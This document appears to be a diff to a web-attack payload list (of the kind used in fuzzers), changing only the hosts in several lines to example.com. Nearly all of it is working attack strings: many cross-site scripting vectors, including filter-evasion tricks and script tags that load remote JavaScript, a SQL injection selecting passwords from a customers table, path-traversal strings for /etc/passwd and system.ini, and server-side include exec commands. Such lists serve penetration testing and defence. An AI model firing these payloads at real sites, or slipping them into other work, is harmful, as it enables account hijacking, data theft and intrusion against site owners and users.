@@ -89,7 +89,7 @@ a?<script>alert('Vulnerable')</script>
 %3Cscript%3Ealert(document. domain);%3C/script%3E&
 %3Cscript%3Ealert(document.domain);%3C/script%3E&SESSION_ID={SESSION_ID}&SESSION_ID=
 1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=
-http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd
+http://example.com/http://example.com/http://example.com/http://example.com/etc/passwd
 ..\..\..\..\..\..\..\..\windows\system.ini
 \..\..\..\..\..\..\..\..\windows\system.ini
 '';!--"<XSS>=&{()}
@@ -112,7 +112,7 @@ http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.
 <IMG LOWSRC="javascript:alert('XSS')">
 <BGSOUND src="javascript:alert('XSS');">
 <br size="&{alert('XSS')}">
-<LAYER src="http://xss.ha.ckers.org/a.js"></layer>
+<LAYER src="http://example.com/a.js"></layer>
 <LINK REL="stylesheet" href="javascript:alert('XSS');">
 <IMG src='vbscript:msgbox("XSS")'>
 <IMG src="mocha:[code]">
@@ -122,7 +122,7 @@ http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.
 <FRAMESET><FRAME src=javascript:alert('XSS')></FRAME></FRAMESET>
 <TABLE BACKGROUND="javascript:alert('XSS')">
 <DIV STYLE="background-image: url(javascript:alert('XSS'))">
-<DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html');">
+<DIV STYLE="behaviour: url('http://example.com/exploit.html');">
 <DIV STYLE="width: expression(alert('XSS'));">
 <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
 <IMG STYLE='xss:expre\ssion(alert("XSS"))'>
@@ -134,14 +134,14 @@ getURL("javascript:alert('XSS')")
 a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d);
 <XML src="javascript:alert('XSS');">
 "> <BODY ONLOAD="a();"><SCRIPT>function a(){alert('XSS');}</SCRIPT><"
-<SCRIPT src="http://xss.ha.ckers.org/xss.jpg"></SCRIPT>
+<SCRIPT src="http://example.com/xss.jpg"></SCRIPT>
 <IMG src="javascript:alert('XSS')"
-<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://xss.ha.ckers.org/a.js></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://example.com/a.js></SCRIPT>'"-->
 <IMG src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
-<SCRIPT a=">" src="http://xss.ha.ckers.org/a.js"></SCRIPT>
-<SCRIPT =">" src="http://xss.ha.ckers.org/a.js"></SCRIPT>
-<SCRIPT a=">" '' src="http://xss.ha.ckers.org/a.js"></SCRIPT>
-<SCRIPT "a='>'" src="http://xss.ha.ckers.org/a.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT src="http://xss.ha.ckers.org/a.js"></SCRIPT>
+<SCRIPT a=">" src="http://example.com/a.js"></SCRIPT>
+<SCRIPT =">" src="http://example.com/a.js"></SCRIPT>
+<SCRIPT a=">" '' src="http://example.com/a.js"></SCRIPT>
+<SCRIPT "a='>'" src="http://example.com/a.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT src="http://example.com/a.js"></SCRIPT>
 <A href=http://www.gohttp://www.google.com/ogle.com/>link</A>
 ```
